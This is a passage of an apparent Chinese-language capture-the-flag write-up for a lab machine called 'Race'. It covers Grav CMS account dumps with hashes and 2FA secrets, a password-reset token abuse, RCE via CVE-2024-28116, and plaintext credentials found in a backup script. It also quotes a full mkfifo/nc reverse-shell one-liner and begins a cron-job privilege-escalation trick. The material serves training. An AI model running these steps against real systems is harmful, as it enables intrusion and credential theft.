CODE_OF_CONDUCT.md</span><br><span class="line">.rw-r--r-- 4.6k wansh  2 Oct  2023  composer.json</span><br><span class="line">.rw-r--r-- 232k wansh  2 Oct  2023  composer.lock</span><br><span class="line">.rw-r--r-- 7.1k wansh  2 Oct  2023  CONTRIBUTING.md</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  images</span><br><span class="line">.rw-r--r-- 1.5k wansh  2 Oct  2023  index.php</span><br><span class="line">.rw-r--r-- 1.1k wansh  2 Oct  2023  LICENSE.txt</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  logs</span><br><span class="line">.rw-r--r--   72 wansh  2 Oct  2023  now.json</span><br><span class="line">.rw-r--r-- 7.7k wansh  2 Oct  2023 󰂺 README.md</span><br><span class="line">.rw-r--r--  379 wansh  2 Oct  2023 󰚩 robots.txt</span><br><span class="line">.rw-r--r-- 1.4k wansh  2 Oct  2023 󰒃 SECURITY.md</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  system</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  tmp</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  user</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  vendor</span><br><span class="line">drwxrwxrwx    - wansh  4 Sep 08:29  webserver-configs</span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/images/race-8.png" data-caption=""><img src="/images/race-8.png"></a></p>
+<p>其实很多文件夹里边没东西，比如logs，不过可以翻到他的版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">core:</span><br><span class="line">  grav:</span><br><span class="line">    version: 1.7.43</span><br><span class="line">    schema: 1.7.0_2020-11-20_1</span><br></pre></td></tr></table></figure>
+
+<p>还有一些信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /user/accounts/admin.yaml</span></span><br><span class="line">state: enabled</span><br><span class="line">email: admin@race.vl</span><br><span class="line">fullname: <span class="string">&#x27;Admin I. Strator&#x27;</span></span><br><span class="line">title: Administrator</span><br><span class="line">access:</span><br><span class="line">  admin:</span><br><span class="line">    login: <span class="literal">true</span></span><br><span class="line">    super: <span class="literal">true</span></span><br><span class="line">  site:</span><br><span class="line">    login: <span class="literal">true</span></span><br><span class="line">hashed_password: $2y$10$/e6nnqGJ6un4X6wKPpyeNecHf8wyZ.G//0Q7XhLLuQ15v7sEzKVzS</span><br><span class="line"></span><br><span class="line"><span class="comment"># /user/accounts/backup</span></span><br><span class="line">state: enabled</span><br><span class="line">email: backup@race.vl</span><br><span class="line">fullname: <span class="string">&#x27;Ba C. Kup&#x27;</span></span><br><span class="line">language: zh-cn</span><br><span class="line">content_editor: default</span><br><span class="line">twofa_enabled: <span class="literal">false</span></span><br><span class="line">twofa_secret: SMIJEB7XFJ7AEO6RPCKDWXUZ2MW4MOY4</span><br><span class="line">avatar: &#123;  &#125;</span><br><span class="line">hashed_password: $2y$10<span class="variable">$drGaFWuga2r3uPcQXqSEueEEru4hlWvYu</span>.BixWiisEHdgFNi.BwYK</span><br><span class="line">access:</span><br><span class="line">  admin:</span><br><span class="line">    login: <span class="literal">true</span></span><br><span class="line">    maintenance: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /user/accounts/patrick</span></span><br><span class="line">state: enabled</span><br><span class="line">email: patrick@race.vl</span><br><span class="line">fullname: <span class="string">&#x27;Patrick P. Rick&#x27;</span></span><br><span class="line">language: en</span><br><span class="line">content_editor: default</span><br><span class="line">twofa_enabled: <span class="literal">false</span></span><br><span class="line">twofa_secret: LW35AG7V4U4NLOBVU5P6NG35GP5YWJKT</span><br><span class="line">avatar: &#123;  &#125;</span><br><span class="line">hashed_password: $2y$10<span class="variable">$TWyPZQDqMZJJ</span>/0pLdWUbY.TxVKVMHP3LzfUTo3BYWFRID7uXaoXcC</span><br><span class="line">reset: <span class="string">&#x27;553e7719d2674ae2bfb29eb0aaa806d0::1701718773&#x27;</span></span><br><span class="line">access:</span><br><span class="line">  site:</span><br><span class="line">    login: <span class="literal">true</span></span><br><span class="line">  admin:</span><br><span class="line">    login: <span class="literal">true</span></span><br><span class="line">    super: <span class="literal">false</span></span><br><span class="line">    cache: <span class="literal">false</span></span><br><span class="line">    configuration:</span><br><span class="line">      system: <span class="literal">true</span></span><br><span class="line">      site: <span class="literal">true</span></span><br><span class="line">      media: <span class="literal">false</span></span><br><span class="line">      security: <span class="literal">false</span></span><br><span class="line">      info: <span class="literal">false</span></span><br><span class="line">      pages: <span class="literal">false</span></span><br><span class="line">      <span class="built_in">users</span>: <span class="literal">false</span></span><br><span class="line">    pages: <span class="literal">true</span></span><br><span class="line">    maintenance: <span class="literal">true</span></span><br><span class="line">    themes: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>这三个账户都很贴心的给了hash,但是解不出来</p>
+<p><a data-fancybox="gallery" data-src="/images/race-9.png" data-caption=""><img src="/images/race-9.png"></a></p>
+<p>观察p和admin、backup不太一样的地方，他有一个reset,可能他可以ch重置密码，检索一下有没有这个</p>
+<blockquote>
+<p>注意检索的时候forget和forgot都检索一下</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">╰─ ❯❯ grep <span class="string">&quot;forgot_password&quot;</span> -ri .                                                                                                                                                                                                                        </span><br><span class="line">./backups/user/plugins/login/login.yaml:route_forgot: <span class="string">&#x27;/forgot_password&#x27;</span>            <span class="comment"># Route for the forgot password process</span></span><br><span class="line">./backups/user/plugins/login/blueprints.yaml:              placeholder: <span class="string">&quot;/forgot_password&quot;</span></span><br><span class="line">./backups/user/plugins/login/login.php:            <span class="variable">$this</span>-&gt;login-&gt;getRoute(<span class="string">&#x27;forgot&#x27;</span>) ?: <span class="string">&#x27;/forgot_password&#x27;</span>,</span><br><span class="line">./backups/user/plugins/login/README.md:route_forgot: <span class="string">&#x27;/forgot_password&#x27;</span>            <span class="comment"># Route for the forgot password process</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uri</span> = <span class="variable">$this</span>-&gt;grav[<span class="string">&#x27;uri&#x27;</span>];</span><br><span class="line">       <span class="variable">$path</span> = <span class="variable">$uri</span>-&gt;path();</span><br><span class="line">       <span class="variable">$this</span>-&gt;redirect_to_login = <span class="variable">$this</span>-&gt;config-&gt;get(<span class="string">&#x27;plugins.login.redirect_to_login&#x27;</span>);</span><br><span class="line"></span><br><span class="line">       // Register route to login page <span class="keyword">if</span> it has been <span class="built_in">set</span>.</span><br><span class="line">       <span class="keyword">if</span> (<span class="variable">$path</span> === <span class="variable">$this</span>-&gt;login-&gt;getRoute(<span class="string">&#x27;login&#x27;</span>)) &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;<span class="built_in">enable</span>([</span><br><span class="line">               <span class="string">&#x27;onPagesInitialized&#x27;</span> =&gt; [<span class="string">&#x27;addLoginPage&#x27;</span>, 0],</span><br><span class="line">           ]);</span><br><span class="line">       &#125; elseif (<span class="variable">$path</span> === <span class="variable">$this</span>-&gt;login-&gt;getRoute(<span class="string">&#x27;forgot&#x27;</span>)) &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;<span class="built_in">enable</span>([</span><br><span class="line">               <span class="string">&#x27;onPagesInitialized&#x27;</span> =&gt; [<span class="string">&#x27;addForgotPage&#x27;</span>, 0],</span><br><span class="line">           ]);</span><br><span class="line">       &#125; elseif (<span class="variable">$path</span> === <span class="variable">$this</span>-&gt;login-&gt;getRoute(<span class="string">&#x27;reset&#x27;</span>)) &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;<span class="built_in">enable</span>([</span><br><span class="line">               <span class="string">&#x27;onPagesInitialized&#x27;</span> =&gt; [<span class="string">&#x27;addResetPage&#x27;</span>, 0],</span><br><span class="line">           ]);</span><br><span class="line">       &#125; elseif (<span class="variable">$path</span> === <span class="variable">$this</span>-&gt;login-&gt;getRoute(<span class="string">&#x27;register&#x27;</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;<span class="built_in">enable</span>([</span><br><span class="line">               <span class="string">&#x27;onPagesInitialized&#x27;</span> =&gt; [<span class="string">&#x27;addRegisterPage&#x27;</span>, 0],</span><br><span class="line">           ]);</span><br><span class="line">       &#125; elseif (<span class="variable">$path</span> === <span class="variable">$this</span>-&gt;login-&gt;getRoute(<span class="string">&#x27;activate&#x27;</span>)) &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;<span class="built_in">enable</span>([</span><br><span class="line">               <span class="string">&#x27;onPagesInitialized&#x27;</span> =&gt; [<span class="string">&#x27;handleUserActivation&#x27;</span>, 0],</span><br><span class="line">           ]);</span><br><span class="line">       &#125; elseif (<span class="variable">$path</span> === <span class="variable">$this</span>-&gt;login-&gt;getRoute(<span class="string">&#x27;profile&#x27;</span>)) &#123;</span><br><span class="line">           <span class="variable">$this</span>-&gt;<span class="built_in">enable</span>([</span><br><span class="line">               <span class="string">&#x27;onPagesInitialized&#x27;</span> =&gt; [<span class="string">&#x27;addProfilePage&#x27;</span>, 0],</span><br><span class="line">           ]);</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>
+
+<p>有<code>/forgot_password</code>存在</p>
+<p><a data-fancybox="gallery" data-src="/images/race-10.png" data-caption=""><img src="/images/race-10.png"></a></p>
+<p>但是点send也只会提示发送到邮箱了</p>
+<p>不太对不太对，再检索一下有没有</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">╰─ ❯❯ grep <span class="string">&quot;reset_password&quot;</span> -ri ./backups/                                                                                </span><br><span class="line">./backups/user/plugins/admin/classes/plugin/Controllers/Login/LoginController.php:                <span class="variable">$this</span>-&gt;setMessage(<span class="variable">$this</span>-</span><br><span class="line">&gt;translate(<span class="string">&#x27;PLUGIN_ADMIN.RESET_PASSWORD_RESET&#x27;</span>));                                                                         </span><br><span class="line">./backups/user/plugins/admin/languages/th.yaml:  RESET_PASSWORD_RESET: <span class="string">&quot;ตั้งค่ารหัสผ่านแล้ว&quot;</span>     </span><br><span class="line">./backups/user/plugins/admin/languages/sv.yaml:  RESET_PASSWORD_RESET: <span class="string">&quot;Lösenordet har återställts&quot;</span></span><br><span class="line">./backups/user/plugins/admin/languages/cs.yaml:  RESET_PASSWORD_RESET: <span class="string">&quot;Heslo bylo změněno&quot;</span></span><br><span class="line">./backups/user/plugins/admin/languages/gl.yaml:  RESET_PASSWORD_RESET: <span class="string">&quot;O contrasinal foi restabelecido&quot;</span></span><br><span class="line">./backups/user/plugins/admin/languages/fi.yaml:  RESET_PASSWORD_RESET: <span class="string">&quot;Salasana on nollattu&quot;</span>            </span><br><span class="line">./backups/user/plugins/admin/languages/sr.yaml:  RESET_PASSWORD_RESET: <span class="string">&quot;Лозинка је ресетована&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>出现一个<code>logincontroller.php</code>的文件，这个看着有意思，进去看一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Do not trust username from the request.</span><br><span class="line">  <span class="variable">$fullname</span> = <span class="variable">$user</span>-&gt;fullname ?: <span class="variable">$username</span>;</span><br><span class="line">  <span class="variable">$author</span> = <span class="variable">$config</span>-&gt;get(<span class="string">&#x27;site.author.name&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">  <span class="variable">$sitename</span> = <span class="variable">$config</span>-&gt;get(<span class="string">&#x27;site.title&#x27;</span>, <span class="string">&#x27;Website&#x27;</span>);</span><br><span class="line">  <span class="variable">$reset_link</span> = <span class="variable">$this</span>-&gt;getAbsoluteAdminUrl(<span class="string">&quot;/reset/u/&#123;<span class="variable">$username</span>&#125;/&#123;<span class="variable">$token</span>&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>里面有这样一段，提示我们resetpassword的连接应该是什么样的，试一下</p>
+<p>token那里如果写<code>553e7719d2674ae2bfb29eb0aaa806d0::1701718773</code>的话会跳转到<code>/admin/forget</code>还是发邮件那个，如果去掉<code>::1701718773</code>的话就会转到直接修改密码的页面</p>
+<p><a data-fancybox="gallery" data-src="/images/race-11.png" data-caption=""><img src="/images/race-11.png"></a></p>
+<blockquote>
+<p>但是要注意:Note: Password length is 32 chars or longer to prevent online and offline brute-force attacks.</p>
+</blockquote>
+<p>然后就一直会提示</p>
+<p><a data-fancybox="gallery" data-src="/images/race-12.png" data-caption=""><img src="/images/race-12.png"></a></p>
+<p>索性设置成和backup一样的</p>
+<blockquote>
+<p>除此之外，也需要及时更新下载备份获取token</p>
+</blockquote>
+<p><a data-fancybox="gallery" data-src="/images/race-14.png" data-caption=""><img src="/images/race-14.png"></a></p>
+<p>登上来了，看一下</p>
+<h3 id="CVE-2024-28116"><a href="#CVE-2024-28116" class="headerlink" title="CVE-2024-28116"></a>CVE-2024-28116</h3><p>google找一下gravcms的漏洞</p>
+<p>有新的CVE但是这个用不了</p>
+<p><a data-fancybox="gallery" data-src="/images/race-15.png" data-caption=""><img src="/images/race-15.png"></a></p>
+<p>找到了[CVE-2024-28116]，可以进行模板注入</p>
+<p>找到一个<a target="_blank" rel="noopener" href="https://github.com/gunzf0x/Grav-CMS-RCE-Authenticated">Grav-CMS-RCE-Authenticated</a>的poc</p>
+<p>但是如果执行<code>id</code>、<code>whoami</code>的话不会有什么返回结果，所幸试一下可不可以反弹shell</p>
+<p><a data-fancybox="gallery" data-src="/images/race-16.png" data-caption="alt text"><img src="/images/race-16.png" alt="alt text"></a></p>
+<p>还可以的</p>
+<h2 id="Shell-As-www-data"><a href="#Shell-As-www-data" class="headerlink" title="Shell As www-data"></a>Shell As www-data</h2><h3 id="User-Max-Home-File-Get-Creds"><a href="#User-Max-Home-File-Get-Creds" class="headerlink" title="User-Max Home File Get Creds"></a>User-Max Home File Get Creds</h3><p>枚举一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@race:/var/www/html/racers$ <span class="built_in">cat</span> /etc/passwd | grep bash</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep bash                                  </span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">patrick:x:1000:1000:Patrick:/home/patrick:/bin/bash</span><br><span class="line">max:x:1001:1001::/home/max:/bin/bash            </span><br></pre></td></tr></table></figure>
+
+<p>看一下家目录下面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www-data@race:/home$ <span class="built_in">ls</span> -la                                  </span><br><span class="line"><span class="built_in">ls</span> -la                                                       </span><br><span class="line">total 16                                                     </span><br><span class="line">drwxr-xr-x  4 root    root    4096 Dec  3  2023 .                                                                         </span><br><span class="line">drwxr-xr-x 19 root    root    4096 Aug 27 10:47 ..           </span><br><span class="line">drwxr-xr-x  5 max     max     4096 Dec  9  2023 max</span><br><span class="line">drwxr-xr-x  5 patrick patrick 4096 Aug 26 23:05 patrick</span><br></pre></td></tr></table></figure>
+
+<p>多了一个max,看看能不能进去</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@race:/home$ <span class="built_in">cd</span> max</span><br><span class="line"><span class="built_in">cd</span> max                                                       </span><br><span class="line">www-data@race:/home/max$ <span class="built_in">ls</span> -la             </span><br><span class="line"><span class="built_in">ls</span> -la                                                                                                                    </span><br><span class="line">total 36                                                     </span><br><span class="line">drwxr-xr-x 5 max  max  4096 Dec  9  2023 .                  </span><br><span class="line">drwxr-xr-x 4 root root 4096 Dec  3  2023 ..    </span><br><span class="line">lrwxrwxrwx 1 root root    9 Dec  3  2023 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 max  max   220 Jan  6  2022 .bash_logout</span><br><span class="line">-rw-r--r-- 1 max  max  3771 Jan  6  2022 .bashrc</span><br><span class="line">drwx------ 2 max  max  4096 Dec  3  2023 .cache                                                                           </span><br><span class="line">drwxrwxr-x 3 max  max  4096 Dec  9  2023 .<span class="built_in">local</span>  </span><br><span class="line">-rw-r--r-- 1 max  max   807 Jan  6  2022 .profile                                                                         </span><br><span class="line">drwxrwxr-x 2 max  max  4096 Dec  4  2023 bin</span><br><span class="line">lrwxrwxrwx 1 max  max    29 Dec  9  2023 race-scripts -&gt; /usr/local/share/race-scripts</span><br><span class="line">-rw-r----- 1 root max    33 Sep  4 07:01 user.txt  </span><br></pre></td></tr></table></figure>
+
+<p>不仅可以，还有一个<code>/bin</code>文件夹，还有一个软链接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">www-data@race:/home/max$ <span class="built_in">cd</span> bin</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line">www-data@race:/home/max/bin$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 8</span><br><span class="line">drwxrwxr-x 2 max max 4096 Dec  4  2023 .</span><br><span class="line">drwxr-xr-x 5 max max 4096 Dec  9  2023 ..</span><br><span class="line">www-data@race:/home/max/bin$ <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">www-data@race:/home/max$ <span class="built_in">ls</span> -la race-scripts</span><br><span class="line"><span class="built_in">ls</span> -la race-scripts</span><br><span class="line">lrwxrwxrwx 1 max max 29 Dec  9  2023 race-scripts -&gt; /usr/local/share/race-scripts</span><br><span class="line">www-data@race:/home/max$ <span class="built_in">cd</span> race-scripts</span><br><span class="line"><span class="built_in">cd</span> race-scripts</span><br><span class="line">www-data@race:/home/max/race-scripts$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 16</span><br><span class="line">drwxrwsr-x 3 root racers 4096 Dec  9  2023 .</span><br><span class="line">drwxr-xr-x 6 root root   4096 Dec  4  2023 ..</span><br><span class="line">drwxr-sr-x 2 root racers 4096 Dec  9  2023 backup</span><br><span class="line">-rwxr-xr-x 1 root root    361 Dec  5  2023 offsite-backup.sh</span><br><span class="line">www-data@race:/home/max/race-scripts$ <span class="built_in">cat</span> off*</span><br><span class="line"><span class="built_in">cat</span> off*</span><br><span class="line"><span class="comment">#!/usr/bin/bash</span></span><br><span class="line"></span><br><span class="line">OFFSITE_HOST=<span class="string">&quot;offsite-backup.race.vl&quot;</span></span><br><span class="line">SOURCE_DIR=<span class="string">&quot;/var/www/html/racers/backup/&quot;</span></span><br><span class="line"><span class="comment"># Disabled USER/PASS for security reasons. Will be provided via environment from cron.</span></span><br><span class="line"><span class="comment"># OFFSITE_USER=&quot;max&quot;</span></span><br><span class="line"><span class="comment"># OFFSITE_PASS=&quot;ruxai0GaemaS1Rah&quot;</span></span><br><span class="line">/usr/bin/curl --insecure --connect-timeout 60 -u <span class="variable">$OFFSITE_USER</span>:<span class="variable">$OFFSITE_PASS</span> -T <span class="variable">$SOURCE_DIR</span> sftp://<span class="variable">$OFFSITE_HOST</span>/backups/</span><br></pre></td></tr></table></figure>
+<p>意外之喜，之前找到backup的时候并没有列出来原来是注释掉了</p>
+<p>登一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">www-data@race:/home/max/race-scripts$ su max</span><br><span class="line">su max</span><br><span class="line">Password: ruxai0GaemaS1Rah</span><br><span class="line"></span><br><span class="line">max@race:~/race-scripts$ </span><br></pre></td></tr></table></figure>
+
+<h2 id="Shell-As-Max"><a href="#Shell-As-Max" class="headerlink" title="Shell As Max"></a>Shell As Max</h2><h3 id="Enum-Scheduled-Task"><a href="#Enum-Scheduled-Task" class="headerlink" title="Enum Scheduled Task"></a>Enum Scheduled Task</h3><p>看了一下没有在sudoers里面，但是我们找到凭据的脚本是root在执行的</p>
+<p>传一个pspy看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">2025/09/05 08:09:01 CMD: UID=0     PID=29791  | /usr/sbin/CRON -f -P </span><br><span class="line">2025/09/05 08:09:01 CMD: UID=0     PID=29790  | /usr/sbin/CRON -f -P </span><br><span class="line">2025/09/05 08:09:01 CMD: UID=0     PID=29792  | /usr/sbin/CRON -f -P </span><br><span class="line">2025/09/05 08:09:01 CMD: UID=0     PID=29794  | /usr/bin/bash /usr/local/bin/secure-cron-runner.sh </span><br><span class="line">2025/09/05 08:09:01 CMD: UID=0     PID=29793  | /bin/sh -c /usr/local/bin/secure-cron-runner.sh &gt;/dev/null 2&gt;/dev/null </span><br><span class="line">2025/09/05 08:09:01 CMD: UID=0     PID=29797  | /usr/bin/bash /usr/local/bin/secure-cron-runner.sh </span><br><span class="line">2025/09/05 08:09:01 CMD: UID=0     PID=29796  | /usr/bin/bash /usr/local/bin/secure-cron-runner.sh </span><br><span class="line">2025/09/05 08:09:01 CMD: UID=0     PID=29795  | /usr/bin/bash /usr/local/bin/secure-cron-runner.sh </span><br><span class="line">2025/09/05 08:09:01 CMD: UID=0     PID=29798  | /usr/bin/bash /usr/local/share/race-scripts/offsite-backup.sh </span><br></pre></td></tr></table></figure>
+
+<p><a data-fancybox="gallery" data-src="/images/race-17.png" data-caption=""><img src="/images/race-17.png"></a></p>
+<p>有两个脚本分别被执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /usr/local/bin/secure-cron-runner.sh</span></span><br><span class="line"><span class="comment">#!/usr/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## If scripts need environment variables put them into below file</span></span><br><span class="line"><span class="comment">## so that no one can see them.</span></span><br><span class="line">. /root/conf/secure-cron-runner.env</span><br><span class="line"></span><br><span class="line"><span class="built_in">declare</span> -a scripts</span><br><span class="line"><span class="built_in">declare</span> -a sigs</span><br><span class="line"></span><br><span class="line"><span class="comment">## 0 = offsite-backup by max</span></span><br><span class="line">scripts[0]=<span class="string">&quot;/usr/local/share/race-scripts/offsite-backup.sh&quot;</span></span><br><span class="line">sigs[0]=<span class="string">&quot;d15804b944b40ca8540d37ed6bd80906&quot;</span></span><br><span class="line"><span class="comment">## add other scripts below</span></span><br><span class="line"><span class="comment"># scripts[1]=&quot;&lt;path-to-script&gt;&quot;</span></span><br><span class="line"><span class="comment"># sigs[1]=&quot;&lt;md5sum&gt;&quot;</span></span><br><span class="line"><span class="comment"># scripts[2]=&quot;&lt;path-to-script&gt;&quot;</span></span><br><span class="line"><span class="comment"># sigs[2]=&quot;&lt;md5sum&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">elems=<span class="variable">$&#123;#scripts[@]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (( j=<span class="number">0</span>; j&lt;<span class="variable">$&#123;elems&#125;</span>; j++ )) ; <span class="keyword">do</span></span><br><span class="line">  sig=$(/usr/bin/md5sum <span class="variable">$&#123;scripts[$j]&#125;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> [[ <span class="string">&quot;x<span class="variable">$sig</span>&quot;</span> == <span class="string">&quot;x<span class="variable">$&#123;sigs[$j]&#125;</span>&quot;</span> ]] ; <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># echo &quot;Script is safe. Running it.&quot; &gt;&gt; /var/log/secure-cron-runner.log</span></span><br><span class="line">    <span class="variable">$&#123;scripts[$j]&#125;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment"># echo &quot;Script is not safe. Skipping it. Please contact patrick to update signature.&quot; &gt;&gt; /var/log/secure-cron-runner.log</span></span><br><span class="line">    :</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<p>这个脚本会对<code>offsite-backup.sh</code>文件进行md5校验</p>
+<p>脚本之间运行存在时间差，但是难以捕捉（对于我来说），我自己的思路是短间隔监控执行命令情况然后进行替换</p>
+<p>然后又去google了一下可不可以进行md5碰撞创建同样md5值的文件，但是没有找到有效办法</p>
+<p>参考0xdf的<a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2025/09/02/htb-race.html#shell-as-max">writeup</a></p>
+<blockquote>
+<p>mkfifo 是创建 命名管道（named pipe &#x2F; FIFO） 的命令。命名管道是文件系统上的特殊文件，允许不同进程通过该“文件”以先进先出（FIFO）的方式进行通信.</p>
+</blockquote>
+<p>其实我感觉和常用的shell命令<code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.15 9001 &gt;/tmp/f</code>是异曲同工</p>
+<p>创建一个<code>offsite-backup.sh</code>的管道，先把md5sum堵住</p>
